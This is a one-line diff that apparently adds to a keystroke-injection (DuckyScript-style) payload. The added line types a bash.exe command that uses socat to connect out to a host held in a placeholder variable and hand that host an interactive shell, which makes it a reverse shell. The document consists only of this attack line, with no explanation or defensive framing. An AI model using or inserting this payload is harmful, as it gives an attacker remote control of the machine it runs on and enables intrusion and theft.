@@ -1,0 +1,1 @@
+STRINGLN bash.exe -c "socat tcp-connect:![$DS_REVERSE_SHELL] exec:sh,pty,stderr,setsid,sigint,sane"
